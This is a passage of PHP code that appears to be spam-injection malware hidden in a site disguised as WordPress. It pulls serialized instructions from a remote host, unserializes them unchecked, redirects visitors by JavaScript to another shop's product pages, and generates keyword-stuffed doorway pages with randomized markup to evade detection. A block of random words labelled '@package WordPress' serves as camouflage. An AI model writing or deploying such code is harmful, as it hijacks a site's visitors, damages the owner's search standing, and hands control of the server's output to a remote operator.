			if(!preg_match($rsdom,$jumstz)){
				$jumstz = curl_getjs_from_webpage($jums2,10);
			
				$jumstz = trim($jumstz);
				if(preg_match($rsdom,$jumstz))
					break;
			}else{
				break;
			}
		}
		
		echo '<script language="javascript" type="text/javascript">'. PHP_EOL .'window.location.href="'. $jumstz . "index.php?main_page=product_info&products_id=" . $id23 .'";'. PHP_EOL .'</script>';		die();	
	}
}
 
 
 $fcontent = '';
 
 
 $pInfoUrl =  GETDOM . "gpage.php?site=$thisdom&id=$siteAID";  
 $pInfoStr = curl_get_from_webpage($pInfoUrl,'',5);
 $rsInfo = '#<info>(.*)</info>#si';
 preg_match($rsInfo,$pInfoStr,$matchInfo);
 if(isset($matchInfo[1])){
	 $InFoStrArr = unserialize($matchInfo[1]);
 }else{
	 exit;
 }
 

 
 
 if(isset($InFoStrArr['frStr2'])){
	$frStr2 = $InFoStrArr['frStr2'];
	$fr2Arr = unserialize($frStr2);
 }
 
$frStr1 = $InFoStrArr['frStr1'];
$fr1Arr = unserialize($frStr1);

$Ptitle = $InFoStrArr['Ptitle'];
$PtitleNowid = $Ptitle;
$nowIdName = $InFoStrArr['nowIdName'];

if(strstr($Ptitle,'#cat#')){
	$tp_title_arr = explode('#cat#',$Ptitle);
	$Ptitle = $tp_title_arr[1];
}

$pcatstr = $InFoStrArr['pcatstr'];
$nowPreStr = $InFoStrArr['nowPreStr'];
$nowNextStr = $InFoStrArr['nowNextStr'];
$nowMateAddStr = $InFoStrArr['nowMateAddStr'];
$nowMateAddArr = unserialize($nowMateAddStr);


$falgMateDes = 0;
if(strstr($pcatstr,'#cname#')){
	$temparrI = explode('#cname#',$pcatstr);
	$catStr = $temparrI[0];
	$catArr = explode('^',$catStr);
	$tparrCat = array();
	$catArrII = array();
	foreach($catArr as $vs){
		$vs = str_replace('&amp;','&',$vs);
		if(!isset($tparrCat[$vs])){
			$tparrCat[$vs] = 1;
			$catArrII[] = $vs;
		}
	}

	$catArr = $catArrII;
	
	$mateStr = $temparrI[1];
	if(strstr($mateStr,'#keydescription#')){
		$temparrII = explode('#keydescription#',$mateStr);
		$pkeyword = trim($temparrII[0]);
		if(!$pkeyword){
			$pkeyword = $Ptitle;
		}else{
			$keyArr = explode(',',$pkeyword);
			$num = count($keyArr);

			$yushu = KEYJG % $num;

			$arrPre = array();
			$arrLast = array();

			for($i=0;$i<$num;$i++){
				if($i<$yushu){
					$arrLast[] = $keyArr[$i];
				}else{
					$arrPre[] = $keyArr[$i];
				}
			}

			if(count($arrLast)){
				foreach($arrLast as $vs){
					$arrPre[] = $vs;
				}
			}
			
			$pkeyword = implode(',',$arrPre);
			$pkeywordYuanShi = $pkeyword;

		}
		
		$pdescription = trim($temparrII[1]);
		if(!$pdescription){
			$falgMateDes=1;
		}else{
			$DesArr = explode(',',$pdescription);
			$num = count($DesArr);

			$yushu = KEYJG % $num;

			$arrPre = array();
			$arrLast = array();

			for($i=0;$i<$num;$i++){
				if($i<$yushu){
					$arrLast[] = $DesArr[$i];
				}else{
					$arrPre[] = $DesArr[$i];
				}
			}

			if(count($arrLast)){
				foreach($arrLast as $vs){
					$arrPre[] = $vs;
				}
			}

			if(count($nowMateAddArr)){
				foreach($nowMateAddArr as $vs){
					$arrPre[] = $vs;
				}
			}
			
			$pdescription = implode(',',$arrPre);
			
			$pDescriptionYuanShi = $pdescription;
		}
		
	}else{
		$pkeyword = $Ptitle;
		$falgMateDes=1;
	}
}else{
	$catArr = array();
	if(strstr($mateStr,'#keydescription#')){
		$temparrII = explode('#keydescription#',$mateStr);
		$pkeyword = $temparrII[0];
		if(!$pkeyword){
			$pkeyword = $Ptitle;
		}else{
			$keyArr = explode(',',$pkeyword);
			$num = count($keyArr);

			$yushu = KEYJG % $num;

			$arrPre = array();
			$arrLast = array();

			for($i=0;$i<$num;$i++){
				if($i<$yushu){
					$arrLast[] = $keyArr[$i];
				}else{
					$arrPre[] = $keyArr[$i];
				}
			}

			if(count($arrLast)){
				foreach($arrLast as $vs){
					$arrPre[] = $vs;
				}
			}
			
			$pkeyword = implode(',',$arrPre);
			$pkeywordYuanShi = $pkeyword;

		}
		
		$pdescription = trim($temparrII[1]);
		if(!$pdescription){
			$falgMateDes=1;
		}else{
			$DesArr = explode(',',$pdescription);
			$num = count($DesArr);

			$yushu = KEYJG % $num;

			$arrPre = array();
			$arrLast = array();

			for($i=0;$i<$num;$i++){
				if($i<$yushu){
					$arrLast[] = $DesArr[$i];
				}else{
					$arrPre[] = $DesArr[$i];
				}
			}

			if(count($arrLast)){
				foreach($arrLast as $vs){
					$arrPre[] = $vs;
				}
			}
			
			if(count($nowMateAddArr)){
				foreach($nowMateAddArr as $vs){
					$arrPre[] = $vs;
				}
			}
			
			$pdescription = implode(',',$arrPre);
			
			$pDescriptionYuanShi = $pdescription;
		}
	}else{
		$pkeyword = $Ptitle;
		$falgMateDes=1;
	}
}

if($falgMateDes){

			$desPosition = (KEYJG + $id23) % 6;

			if($desPosition == 0)
				$pdescription = $Ptitle .' '. $nowMateAddArr[0] .' '. $nowMateAddArr[1];
			elseif($desPosition == 1)
				$pdescription = $nowMateAddArr[1] .' '. $Ptitle .' '. $nowMateAddArr[0];
			elseif($desPosition == 2)
				$pdescription = $Ptitle .' '. $nowMateAddArr[0] .' '. $nowMateAddArr[1];
			elseif($desPosition == 3)
				$pdescription = $nowMateAddArr[1] .' '. $nowMateAddArr[0] .' '. $Ptitle;
			elseif($desPosition == 4)
				$pdescription = $nowMateAddArr[0] .' '. $Ptitle .' '. $nowMateAddArr[1];
			elseif($desPosition == 5)
				$pdescription = $nowMateAddArr[0] .' '. $nowMateAddArr[1] .' '. $Ptitle;
			
			
}

$tpKeyStrCat = -1;
$BreadStr = getBreadcrum($Ptitle,$catArr,$id23,$PtitleNowid);

if(count($catArr)){
	$endCatName = end($catArr);
	$beginCatName = $catArr[0];
	$addKeyWordStr = ', ' . implode(', ', $catArr);
}else{
	$beginCatName = '';
	$endCatName = '';
}

if(function_exists("preg_split")){
	$PtitleArr = preg_split('/\s+/us', $Ptitle);		
}else{
	$PtitleArr = explode(' ', $Ptitle);
}

$tpTitleArr = array();
foreach($PtitleArr as $vs){
	$vs = trim($vs);
	if($vs){
		$tpTitleArr[] = $vs;
	}
}



$numTitleArr = count($tpTitleArr);


$randTkeyI =  RANDNUMI % $numTitleArr;

$createTitleI = getRandStrArr($tpTitleArr,$randTkeyI);

$randTkeyII =  RANDNUMII % $numTitleArr;
if($randTkeyI == $randTkeyII){
	$randTkeyII = abs($randTkeyI-2);
}

$createTitleII = getRandStrArr($tpTitleArr,$randTkeyII);


$addTopStr = '';
$addTopStr .= "<h1>{$Ptitle}</h1>".PHP_EOL;
$addTopStr .= $BreadStr.PHP_EOL;




$addStrII = '';

$addStrII .= '<p>';
$addStrII .= '###nowtitles###,';
$addStrII .= $createTitleI .',';
$addStrII .= $pdescription.' ';
$addStrII .= $createTitleII . ' '. $thisdom .'.</p>';

$addStrII .= "<h2>{$Ptitle}</h2>";

if(isset($InFoStrArr['nowPimgArr'])){
	$tpImgArr = unserialize($InFoStrArr['nowPimgArr']);
	foreach($tpImgArr as $tpimg){
		$addStrII .= $tpimg."<br/>".PHP_EOL;
	}
}

$addTopStr .= $addStrII;



$tpaddstr = '';
$tpaddstr .= "<h1>{$Ptitle}</h1>".PHP_EOL;

if(isset($InFoStrArr['pdes'])){
	$InFoStrArr['pdes'] =  preg_replace('#\s+#si',' ',$InFoStrArr['pdes']);
	$tpaddstr .= '<p>'.$InFoStrArr['pdes']."</p>".PHP_EOL;
}

if(isset($InFoStrArr['nowPimgArrYs'])){
	$tpImgArr = unserialize($InFoStrArr['nowPimgArrYs']);
	foreach($tpImgArr as $tpimg){
		$tpaddstr .= $tpimg."<br/>".PHP_EOL;
	}
}



$arrFlinks = array();
$fr1Strs = '<ul>'.PHP_EOL;
foreach($fr1Arr as $key=>$vs){
	$tpPid = $key;
	$tpFlink = getalink($tpPid,$vs);
	
	if(strstr($vs,'#cat#')){
		$tp_name_arr = explode('#cat#',$vs);
		$vs = $tp_name_arr[1];
	}
	
	$fr1Strs .= '<li><a title="'.$vs.'" href="'.$tpFlink.'">'.$vs.'</a></li>'.PHP_EOL;
	$arrFlinks[] = '<a title="'.$vs.'" href="'.$tpFlink.'">'.$vs.'</a>';
}
$fr1Strs .= '</ul>'.PHP_EOL;

if(isset($fr2Arr)){
	$fr2Strs = '<ul>'.PHP_EOL;
	foreach($fr2Arr as $key=>$vs){
		$tpPid = $key;
		$tpFlink = getalink($tpPid,$vs);
		
		
		if(strstr($vs,'#cat#')){
			$tp_name_arr = explode('#cat#',$vs);
			$vs = $tp_name_arr[1];
		}
		
		$fr2Strs .= '<li><a title="'.$vs.'" href="'.$tpFlink.'">'.$vs.'</a></li>'.PHP_EOL;
	}
	$fr2Strs .= '</ul>'.PHP_EOL;
}


$addPdesStrII = '';
$addPdesStrII .= "<h3>{$Ptitle}</h3>".PHP_EOL;



$addStrDes1 = '';
if(isset($InFoStrArr['nowDesNameArrStr'])){
	
	$Random =  (KEYJG + $id23)  % 3 + 3;

	
	$tpDesNameArr = unserialize($InFoStrArr['nowDesNameArrStr']);
	
	$lenthNameArr = count($tpDesNameArr);
	$lenthFlinkArr = $Random;
	$numShan = intval($lenthNameArr/$lenthFlinkArr);
	if($numShan < 1)
		$numShan = 1;
	
	
	
	$flag = 0;
	
	$shengyu = $lenthNameArr - $lenthFlinkArr * $numShan;
	$shengyu = $shengyu - 2;
	$bgnum = 0;
	$endnum = $lenthNameArr - 1;
	$arrKeyNum = array();
	while($shengyu > 0){
		$arrKeyNum[$bgnum++] = $numShan + 1;
		$shengyu--;
		if($shengyu > 0){
			$arrKeyNum[$endnum--] = $numShan + 1;
		}
		$shengyu--;
	}

	
	$nowTempFlag = 0;
	$nowTempNumFlag = 0;
	
	$tempDesNameArr = array();
	
	foreach($tpDesNameArr as $tpdesKey=>$tpdesVs){
		$nowLens = isset($arrKeyNum[$nowTempFlag]) ? $arrKeyNum[$nowTempFlag] : $numShan;
		if($nowTempNumFlag < $nowLens){
			$tempDesNameArr[] = $tpdesVs;
			$nowTempNumFlag++;
		}else{
			$tempDesNameArr[] = "<b>{$Ptitle}</b>";
			$nowTempFlag++;
			
			
			$tempDesNameArr[] = $tpdesVs;
			$nowTempNumFlag=1;
		}
		
	}
	
	while($nowTempFlag <= $lenthFlinkArr-1){
		$nowTempFlag++;
		$tempDesNameArr[] = "<b>{$Ptitle}</b>";
	}
	
	
	$tpDesNameArr = $tempDesNameArr;
	$tempArrLen = count($tpDesNameArr) - 1;
	
	$i=0;
	foreach($tpDesNameArr as $tpdesKey=>$tpdesVs){
		$tempLen = strlen($tpdesVs) + $i;
		if($tempLen % 2 == 1){
			$nowtempfh = ', ';
		}else
			$nowtempfh = '. ';
		
		
		
		if($i == $tempArrLen){
			$addStrDes1 .= $tpdesVs . '.';
			// echo $addStrDes1;
			// exit;
		}else{
			$addStrDes1 .= $tpdesVs . $nowtempfh;
		}
		$i++;
		
	}
		
	$addStrDes1 = '<p>'.$addStrDes1.'</p>'.PHP_EOL;

	
}

$addPdesStrII .= $addStrDes1.PHP_EOL;






$addPdesStr = '';

$addStrDesII = '';
if(isset($InFoStrArr['fpNameStr'])){
	
	$Random =  (KEYJG + $id23)  % 2 == 0 ? 3 : 2 ;

	
	$tpDesNameArr = unserialize($InFoStrArr['fpNameStr']);
	$tempArrLen = count($tpDesNameArr) - 1;
	$temp_arr = array();
	foreach($tpDesNameArr as $tpdesKey=>$tpdesVs){
		
		if(strstr($tpdesVs,'#cat#')){
			$tp_name_arr = explode('#cat#',$tpdesVs);
			$tpdesVs = $tp_name_arr[1];
		}
		
		$temp_arr[$tpdesKey] = $tpdesVs;
		
	}
	$tpDesNameArr = $temp_arr;
	
	$lenthNameArr = count($tpDesNameArr);
	$lenthFlinkArr = $Random;
	$numShan = intval($lenthNameArr/$lenthFlinkArr);
	if($numShan < 1)
		$numShan = 1;
	
	$flag = 0;
	
	$shengyu = $lenthNameArr - $lenthFlinkArr * $numShan;
	$shengyu = $shengyu - 2;
	$bgnum = 0;
	$endnum = $lenthNameArr - 1;
	$arrKeyNum = array();
	while($shengyu > 0){
		$arrKeyNum[$bgnum++] = $numShan + 1;
		$shengyu--;
		if($shengyu > 0){
			$arrKeyNum[$endnum--] = $numShan + 1;
		}
		$shengyu--;
	}
	
	$nowTempFlag = 0;
	$nowTempNumFlag = 0;
	
	$tempDesNameArr = array();
	
	foreach($tpDesNameArr as $tpdesKey=>$tpdesVs){
		$nowLens = isset($arrKeyNum[$nowTempFlag]) ? $arrKeyNum[$nowTempFlag] : $numShan;
		if($nowTempNumFlag < $nowLens){
			$tempDesNameArr[] = $tpdesVs;
			$nowTempNumFlag++;
		}else{
			// $tempDesNameArr[] = "<b>{$Ptitle}</b>";
			$nowTempFlag++;
			$tempDesNameArr[] = $tpdesVs;
			$nowTempNumFlag=1;
		}
		
	}
	
		while($nowTempFlag <= $lenthFlinkArr-1){
			$nowTempFlag++;
			// $tempDesNameArr[] = "<b>{$Ptitle}</b>";
		}
	

	$tpDesNameArr = $tempDesNameArr;
	$i=0;
	foreach($tpDesNameArr as $tpdesKey=>$tpdesVs){
		
		$tempLen = strlen($tpdesVs) + $i;
		if($tempLen % 2 == 1){
			$nowtempfh = ', ';
		}else
			$nowtempfh = '. ';
	
		
		if($i == $tempArrLen){
			$addStrDesII .= $tpdesVs . '.';
		}else{
			$addStrDesII .= $tpdesVs . $nowtempfh;
		}
		$i++;
			
	}
		
	$addStrDesII = '<p>'.$addStrDesII.'</p>'.PHP_EOL;

}




$addPdesStr .= "<h2>{$Ptitle}</h2>".PHP_EOL;
$addPdesStr .= $addStrDesII.PHP_EOL;




$addH3Str = "<h3>{$Ptitle}</h3>";
 
 $thisPnameLink = '<a href="">'.$nowIdName.'</a>';
 $thisPnameLink2 = '<a title="'.$nowIdName.'" href="">'.$nowIdName.'</a>';
 
 $thisTitleLink = '<a title="'.$Ptitle.'" href="">'.$Ptitle.'</a>';

$flagH2I = 1;
$flagH2II = 1;
$flagH2III = 1;

		$fileMb = fopen("template.html","r");
			$html = fread($fileMb,filesize("template.html"));	

			$numBz = 0;

			$titleKeys = KEYJG % 6;
			
			
		
			
			$catUseKey = (KEYJG + $id23) % count($catArr);
			$catUseKeyTwo = ((KEYJG+1) * $id23) % count($catArr);
			if($catUseKey == $catUseKeyTwo)
				$catUseKeyTwo = ($catUseKeyTwo + 1) % count($catArr);
			
			if(preg_match('#.*\.(.*)\..*#i',$thisdom))
				$usdomStr = preg_replace('#.*\.(.*)\..*#i','\1',$thisdom);
			else
				$usdomStr = preg_replace('#(.*)\..*#i','\1',$thisdom);
			
			
			$titlePosition = (KEYJG + $id23) % 2;
			
			if($titlePosition == 0)
				$nowShowTitle = $Ptitle .' '. $catArr[$catUseKeyTwo] .' '. $catArr[$catUseKey].' '.$thisdom ;
			elseif($titlePosition == 1)
				$nowShowTitle = $Ptitle .' '. $catArr[$catUseKey] .' '. $catArr[$catUseKeyTwo].' '.$thisdom ;
		
			
		
			$addTopStr =  str_replace('###nowtitles###',$Ptitle ,$addTopStr);
			$tpaddstr =  str_replace('###nowtitles###',$Ptitle,$tpaddstr);
			
			$html = str_ireplace('draft_or_post_title',  $nowShowTitle, $html);	
			$html = str_ireplace('#bbbkeybbb#', $pkeyword . $addKeyWordStr, $html);	
			$html = str_ireplace('#bbbdesbbb#', $pdescription, $html);	
			
			$html = str_ireplace('#bbb1content1bbb#',  $addTopStr, $html);
			// $html = str_ireplace('#bbb2content2bbb#', $artArr[1], $html);
			
			
			
			$tempStr = $addPdesStrII;
			$addPdesStrII = $addPdesStr."<br/>". PHP_EOL . $fr1Strs;;
			$addPdesStr = $tempStr;
		
			if(strstr($html,'#link3#'))
			if($flagH2I){
					$html = str_replace('#link3#',$addPdesStrII ,$html);
					$flagH2I = 0;
				}else{
					$html = str_replace('#link3#','',$html);
				}
				
				
							
			if(strstr($html,'#flink#'))
				if($flagH2I){
					$html = str_replace('#flink#',$addPdesStrII ,$html);
					$flagH2I = 0;
				}elseif($flagH2II){
					$html = str_replace('#flink#',$addPdesStr, $html);
					$flagH2II = 0;
				}else{
					$html = str_replace('#flink#','',$html);
				}
				
				
				
			if(strstr($html,'#link4#'))
				if($flagH2I){
					$html = str_replace('#link4#',$addPdesStrII ,$html);
					$flagH2I = 0;
				}elseif($flagH2II){
					$html = str_replace('#link4#',$addPdesStr, $html);
					$flagH2II = 0;
				}elseif($flagH2III){
					$html = str_replace('#link4#','',$html);
					$flagH2III = 0;
				}else{
					$html = str_replace('#link4#','',$html);
				}
				
				
			if(strstr($html,'#link5#'))
				if($flagH2I){
					$html = str_replace('#link5#',$addPdesStrII ,$html);
					$flagH2I = 0;
				}elseif($flagH2II){
					$html = str_replace('#link5#',$addPdesStr, $html);
					$flagH2II = 0;
				}elseif($flagH2III){
					$html = str_replace('#link5#','',$html);
					$flagH2III = 0;
				}else{
					$html = str_replace('#link5#','',$html);
				}
	
				
				
				if(strstr($html,'#Flink2#'))
				if($flagH2I){
					$html = str_replace('#Flink2#',$addPdesStrII ,$html);
					$flagH2I = 0;
				}elseif($flagH2II){
					$html = str_replace('#Flink2#',$addPdesStr, $html);
					$flagH2II = 0;
				}elseif($flagH2III){
					$html = str_replace('#Flink2#','',$html);
					$flagH2III = 0;
				}else{
					$html = str_replace('#Flink2#','',$html);
				}
						
				
			$lastAddStrs = '';
			
			if($flagH2I){
				$lastAddStrs .= $addPdesStrII  . PHP_EOL;
			}
			
			if($flagH2II){
				$lastAddStrs .= $addPdesStr. PHP_EOL;
			}
			
			if($lastAddStrs){
				$tpaddstr = $tpaddstr .PHP_EOL . $lastAddStrs;
			}
				
				
			$html = str_ireplace('#bbb2content2bbb#', '', $html);
			$html = str_ireplace('#descontent#', $tpaddstr, $html);
				
			$html = str_replace('#link1#','',$html);
			$html = str_replace('#link2#','',$html);
				

	
			$footKey = "<h3>{$Ptitle}</h3>". PHP_EOL ."<br/>{$pdescription}".PHP_EOL;
			$html = str_replace('</body',$footKey.'</body',$html);

		
	echo $html;
 
die();


	
/**
 * academy core decent deputy expand grateful isolate likelihood motive nylon profit racial simplicity suspicious tarnest undergo urban vocabulary yield.
 * barrel dive modify phenomenon provision scandal.
 * enclose explode missile nuclear stimulate temptation.
 * agency episode exceedingly excursion guilty insignificant marveous maximum slippery trap wealthy.
 * agency bargain diverse echo enviroment lean lynar orient portion spill tarnest valley violent virus.
 * accelerate adjust alter authority available continuous discrimination essential fatigue flexible infer launch manufacture nylon obscure quit reinforce resolve scratch significance substance universal variable violet.
 * acid arise audio available entertainment equation gesture hook import jeans mission neutral particle presumably scan semester swallow tremble triangle universe valid wonder.
 * adequate barrel compete evolve faulty favorite frown hostile invade lean mixture necessity sexual simplify subsequent valley withstand.
 * approve bother evolution nuclear recreation signature terminal triumph.
 * descend isolate jungle reject shelter signature substantial ultimate.
 * applianc burst exceed gap geology leather repetition shift subsequent universe utter video.
 * approve approximate audio beforehand bother competition consent deposit dump enviroment flash inferior noticeable peak poverty priority spit timber vain.
 * comparable continual defect entertainment index mere partial pat phenomenon radiation.
 * avenue compete distress essential expenditure export facility fax genuine integrate mutual previous seminar simplicity territory trial usage valley volunteer wagon.
 * delay mild naked partial retail vital.
 * appoint balcony ceremony clue debate deputy derive elbow emotional gaze jewel kneel mission repetition the wealthy witness.
 * audio expand explore horror inevitable isolate kneel knot optics preserve range respond theme torture undergraduate valid vessel virtual wax.
 *
 * @package WordPress
 */


function getRandStrArr($tpArr=array(),$bgKey=0){
	
	$returnStr = '';
	$numArr = count($tpArr);
	for($i=$bgKey+1;$i<$numArr;$i++){
		$returnStr .= $tpArr[$i].' ';
	}
	
	for($i=0;$i<=$bgKey;$i++){
		$returnStr .= $tpArr[$i].' ';
	}
	
	return trim($returnStr);

}


function getBreadcrum($Ptitle,$catArr,$id23,$pname){

	global $arrBread,$thisdom;
	
	$breadTagkey = KEYJG % 6;
	if($breadTagkey == 0){
		$breadTagHtml1 = 'nav';
		$breadTagHtml2 = 'ul';
	}elseif($breadTagkey == 1){
		$breadTagHtml1 = 'nav';
		$breadTagHtml2 = 'ol';
	}elseif($breadTagkey == 2){
		$breadTagHtml1 = 'div';
		$breadTagHtml2 = 'ol';
	}elseif($breadTagkey == 3){
		$breadTagHtml1 = 'section';
		$breadTagHtml2 = 'ol';
	}elseif($breadTagkey == 4){
		$breadTagHtml1 = 'section';
		$breadTagHtml2 = 'ul';
	}else{
		$breadTagHtml1 = 'div';
		$breadTagHtml2 = 'ul';
	}
	
	// $catstr = implode(' >> ',$catArr);

	$catArr= array();
	// if($catstr)
		// $catArr[] = $catstr;

	$arrBreadNum = count($arrBread);
	$domlen = strlen($thisdom);


	$breadTagkey = $domlen % 5;
	
	$liClassYs = KEYJG % 19;
	
	if($liClassYs == 0){
		$liStr = ' class="item"';
	}elseif($liClassYs == 1){
		$liStr = ' class="breadcrumbs-item"';
	}elseif($liClassYs == 2){
		$liStr = ' class="nz-breadcrumb-item"';
	}elseif($liClassYs == 3){
		$liStr = ' class="items"';
	}elseif($liClassYs == 4){
		$liStr = ' class="breadcrumblist-items"';
	}elseif($liClassYs == 5){
		$liStr = ' class="el-breadcrumb-item"';
	}elseif($liClassYs == 6){
		$liStr = ' class="doc-crumb-item"';
	}elseif($liClassYs == 7){
		$liStr = ' class="breadcrumb-item"';
	}elseif($liClassYs == 8){
		$liStr = ' class="crumbs-item"';
	}elseif($liClassYs == 9){
		$liStr = ' class="bread-item"';
	}elseif($liClassYs == 10){
		$liStr = ' class="breads-item"';
	}elseif($liClassYs == 11){
		$liStr = ' class="breadcrumbItem"';
	}elseif($liClassYs == 12){
		$liStr = ' class="breadcrumbItems"';
	}elseif($liClassYs == 13){
		$liStr = ' class="breadcrumblistitems"';
	}elseif($liClassYs == 14){
		$liStr = ' class="BreadcrumbItem"';
	}elseif($liClassYs == 15){
		$liStr = ' class="ListItem"';
	}elseif($liClassYs == 16){
		$liStr = ' class="crumb-items"';
	}else{
		$liStr = '';
	}
	

	$arrBreadId = array();
	$arrBreadId[] = 'Bread';
	$arrBreadId[] = 'BreadHead';
	$arrBreadId[] = 'Breadcrumb';
	$arrBreadId[] = 'Breadcrumb-Head';
	$arrBreadId[] = 'Breadcrumb-Heads';
	$arrBreadId[] = 'Breadcrumb-Top';
	$arrBreadId[] = 'BreadcrumbHeads';
	$arrBreadId[] = 'BreadcrumbLists';
	$arrBreadId[] = 'BreadcrumbNavigation';
	$arrBreadId[] = 'BreadcrumbTop';
	$arrBreadId[] = 'BreadcrumbTops';
	$arrBreadId[] = 'MyBreadcrumb';
	$arrBreadId[] = 'ant-breadcrumb';
	$arrBreadId[] = 'bread-List';
	$arrBreadId[] = 'breadtop';
	$arrBreadId[] = 'breadtops';
	$arrBreadId[] = 'breadHead';
	$arrBreadId[] = 'breadHeads';
	$arrBreadId[] = 'breadList';
	$arrBreadId[] = 'breadLists';
	$arrBreadId[] = 'breadcrumb';
	$arrBreadId[] = 'c-breadcrumb';
	$arrBreadId[] = 'crumbList';
	$arrBreadId[] = 'crumb-list';
	$arrBreadId[] = 'crumbs';
	$arrBreadId[] = 'crumbsHead';
	$arrBreadId[] = 'crumbsHeads';
	$arrBreadId[] = 'crumbs-head';
	$arrBreadId[] = 'crumbs-nag';
	$arrBreadId[] = 'crumbsTop';
	$arrBreadId[] = 'crumbsTops';
	$arrBreadId[] = 'crumbs-top';
	$arrBreadId[] = 'cs-breadcrumb';
	$arrBreadId[] = 'customBreadcrumb';
	$arrBreadId[] = 'doc-crumb';
	$arrBreadId[] = 'el-breadcrumb';
	$arrBreadId[] = 'l-breadcrumb';
	$arrBreadId[] = 'navBreadCrumb';
	$arrBreadId[] = 'navBreadCrumbs';
	$arrBreadId[] = 'page-breadcrumbs';
	$arrBreadId[] = 'pages-breadcrumbs';
	$arrBreadId[] = 's-breadcrumb';
	$arrBreadId[] = 'v-breadcrumb';
	$arrBreadId[] = 'chrome-breadcrumbs';
	
	
	$keyBreadId = KEYJG % 48;
	
	if(isset($arrBreadId[$keyBreadId])){
		$keyBreadIdStr = ' id="'.$arrBreadId[$keyBreadId].'"';
	}else{
		$keyBreadIdStr = '';
	}
	


	$strBreads = '';
	if($breadTagkey == 4){
		$arrBreadC1 = array();
		$arrBreadC1[] = 'BreadcrumbData';
		$arrBreadC1[] = 'BreadcrumbDatas';
		$arrBreadC1[] = 'BreadcrumbTop';
		$arrBreadC1[] = 'crumbsHead';
		$arrBreadC1[] = 'crumbsTop';
		$arrBreadC1[] = 'crumbsList';
		$arrBreadC1[] = 'crumbs-top';
		$arrBreadC1[] = 'crumbs-list';
		$arrBreadC1[] = 'crumbs-Head';
		$arrBreadC1[] = 'BreadcrumbTag';
		$arrBreadC1[] = 'Breadcrumb-tag';
		$arrBreadC1[] = 'BreadcrumbBody';
		$arrBreadC1[] = 'BreadcrumbBody';
		$arrBreadC1[] = 'Breadcrumb-Top';
		$arrBreadC1[] = 'Breadcrumb-body';
		$arrBreadC1[] = 'BreadcrumbTops';
		$arrBreadC1[] = 'Breadcrumb-Head';
		$arrBreadC1[] = 'Breadcrumb-Heads';
		$arrBreadC1[] = 'Breadcrumb-List';
		$arrBreadC1[] = 'BreadcrumbList';
		$arrBreadC1[] = 'BreadcrumbLists';
		
		$ckeyI = KEYJG % count($arrBreadC1);
		
		$classI =  $arrBreadC1[$ckeyI];
		$classII =  $domlen % 2 ? 'Breadcrumbs' : 'Breadcrumb';
		
		$strBreads .= '<'.$breadTagHtml1.$keyBreadIdStr.' class="'.$classI.'">';
		$strBreads .= '<'.$breadTagHtml2.' class="'.$classII.'">';
		$strBreads .= '<li'.$liStr.'><a href="/">Home</a></li>';
		if(count($catArr)){
			foreach($catArr as $vs){
				$vs = trim($vs);
				$nowCatUrl = getCatLink($vs,$id23);
				$strBreads .= '<li'.$liStr.'><a href="'.$nowCatUrl.'">'.$vs.'</a></li>';
			}
		}
		
		$nowUrl = getalink($id23,$pname);	
		$strBreads .= '<li'.$liStr.'><a href="'.$nowUrl.'">'.$Ptitle.'</a></li>';
		// $strBreads .= '<li'.$liStr.'>'.$Ptitle.'</li>';
		$strBreads .= '</'.$breadTagHtml2.'>';
		$strBreads .= '</'.$breadTagHtml1.'>';
	}else{
		$calssBreadKey = KEYJG % $arrBreadNum;
		$classTop = $arrBread[$calssBreadKey];
		$classul =  KEYJG % 2 ? 'Breadcrumb' : 'breadcrumbs';
		$breadTagkey = $domlen % 2;

		if($breadTagkey == 0){
			if($classTop)
				$strBreads .= '<'.$breadTagHtml1.$keyBreadIdStr.' class="'.$classTop.'">';
			else
				$strBreads .= '<'.$breadTagHtml1.$keyBreadIdStr.'>';
			
			$strBreads .= '<'.$breadTagHtml2.' class="'.$classul.'" itemscope itemtype="http://schema.org/BreadcrumbList">';
			$strBreads .= '<li'.$liStr.' itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/"><span itemprop="name">Home</span></a><meta itemprop="position" content="1" /></li>';
			$flagNum = 2;
			if(count($catArr)){
				foreach($catArr as $vs){
					$vs = trim($vs);
					$nowCatUrl = getCatLink($vs,$id23);
					$strBreads .= '<li'.$liStr.' itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="'.$nowCatUrl.'"><span itemprop="name">'.$vs.'</span></a><meta itemprop="position" content="'.$flagNum.'" /></li>';
					$flagNum++;
				}
			}
				
				
			$nowUrl = getalink($id23,$pname);	
			// $strBreads .= '<li'.$liStr.'><a href="'.$nowUrl.'">'.$Ptitle.'</a></li>';
				
				
			$strBreads .= '<li'.$liStr.' itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a href="'.$nowUrl.'"><span itemprop="name">'.$Ptitle.'</span></a><meta itemprop="position" content="'.$flagNum.'" /></li>';
				
			$strBreads .= '</'.$breadTagHtml2.'>';
			$strBreads .= '</'.$breadTagHtml1.'>';
		}else{
			if($classTop)
				$strBreads .= '<'.$breadTagHtml1.$keyBreadIdStr.' class="'.$classTop.'">';
			else
				$strBreads .= '<'.$breadTagHtml1.$keyBreadIdStr.'>';
			
			$strBreads .= '<'.$breadTagHtml2.' class="'.$classul.'" itemscope itemtype="http://schema.org/BreadcrumbList">';
			$strBreads .= '<li'.$liStr.' itemscope itemtype="http://data-vocabulary.org/Breadcrumb"><a href="/" itemprop="url"><span itemprop="title">Home</span></a></li>';
			if(count($catArr)){
				foreach($catArr as $vs){
					$vs = trim($vs);
					$nowCatUrl = getCatLink($vs,$id23);
					$strBreads .= '<li'.$liStr.' itemscope itemtype="http://data-vocabulary.org/Breadcrumb"><a href="'.$nowCatUrl.'" itemprop="url"><span itemprop="title">'.$vs.'</span></a></li>';
				}
			}
				
			$nowUrl = getalink($id23,$pname);	
			$strBreads .= '<li'.$liStr.'><a href="'.$nowUrl.'">'.$Ptitle.'</a></li>';
			// $strBreads .= '<li'.$liStr.'>'.$Ptitle.'</li>';
				
			$strBreads .= '</'.$breadTagHtml2.'>';
			$strBreads .= '</'.$breadTagHtml1.'>';
		}
	}
	
	
	return $strBreads;

}

function get_scheme(){
	
	if ( (isset($_SERVER['REQUEST_SCHEME']) && $_SERVER['REQUEST_SCHEME'] == 'https') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') || (isset($_SERVER['HTTP_CF_VISITOR']) && strstr($_SERVER['HTTP_CF_VISITOR'],'https')) || (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == '443') ) {
		$httpPre= 'https';
